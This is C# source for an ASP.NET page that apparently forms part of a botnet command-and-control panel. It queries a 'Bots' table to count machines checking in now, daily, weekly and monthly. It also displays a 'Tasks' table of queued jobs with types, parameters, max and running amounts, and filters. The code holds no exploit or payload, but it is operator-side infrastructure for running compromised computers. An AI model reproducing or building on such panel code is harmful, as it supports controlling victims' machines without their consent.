using System;
using System.Data.SqlClient;
using System.Data;
using System.Web;
using System.Web.UI.WebControls;

public partial class Tasks : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        using (SqlConnection conn = new SqlConnection("Data Source=localhost;Initial Catalog=Kennedy;Integrated Security=True"))
        {
            conn.Open();
            int onnlineNow;
            int connToday;
            int connWeek;
            int connMonth;
            int connTotal;

            double connTodayPre;
            double connWeekPre;
            double connMonthPre;
            double connNowPre;

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots;", conn))
            {
                connTotal = (int)cmd.ExecuteScalar();
                lblConnectionsTotal.Text = connTotal.ToString();
                lblTotalBots.Text = connTotal.ToString();
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -5 , GETDATE())));", conn))
            {
                onnlineNow = (int)cmd.ExecuteScalar();
                lblOnnlineNow.Text = onnlineNow.ToString();
                connNowPre = Math.Round((double)(100 * onnlineNow) / connTotal, 1);
                onlineNowPrec.Text = "data-percent=\"" + connNowPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -1, GETDATE())));", conn))
            {
                connToday = (int)cmd.ExecuteScalar();
                lblConnectionsToday.Text = connToday.ToString();
                connTodayPre = Math.Round((double)(100 * connToday) / connTotal, 1);
                connTodayPrec.Text = "data-percent=\"" + connTodayPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -7, GETDATE())));", conn))
            {
                connWeek = (int)cmd.ExecuteScalar();
                lblConnectionsWeek.Text = connWeek.ToString();
                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal, 1);
                connWeekPrec.Text = "data-percent=\"" + connWeekPre + "\"";
            }

            using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(day, -30, GETDATE())));", conn))
            {
                connMonth = (int)cmd.ExecuteScalar();
                lblConnectionsMonth.Text = connMonth.ToString();
                connMonthPre = Math.Round((double)(100 * connMonth) / connTotal, 1);
                connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";

            }

            using (SqlCommand cmd = new SqlCommand("select TaskID, Type, Parameter1, Parameter2, Parameter3, Parameter4, Max, Ran, Filter, Status, Options from Tasks", conn))
            {
                DataSet ds = new DataSet();
                SqlDataReader reader = cmd.ExecuteReader();
                grdTask.DataSource = reader;
                grdTask.DataBind();
                reader.Close();
            }
        }
    }
    protected void grdTask_RowDataBound(object sender, GridViewRowEventArgs e)
    {
        if (e.Row.RowType == DataControlRowType.Header)
        {
            e.Row.Cells[0].Text = "NO.";
            e.Row.Cells[1].Text = "TYPE";
            e.Row.Cells[2].Text = "PARAMETER 1";
            e.Row.Cells[3].Text = "PARAMETER 2";
            e.Row.Cells[4].Text = "PARAMETER 3";
            e.Row.Cells[5].Text = "PARAMETER 4";
            e.Row.Cells[6].Text = "MAX AMOUNT";
            e.Row.Cells[7].Text = "RUNNING AMOUNT";
            e.Row.Cells[8].Text = "FILTERS";
            e.Row.Cells[9].Text = "STATUS";
            e.Row.Cells[10].Text = "OPTIONS";
        }
        foreach (TableCell tc in e.Row.Cells)
        {
            tc.Attributes["style"] = "border-right:none; border-left: none; border-top: none;text-align:left;";
        }
    }
}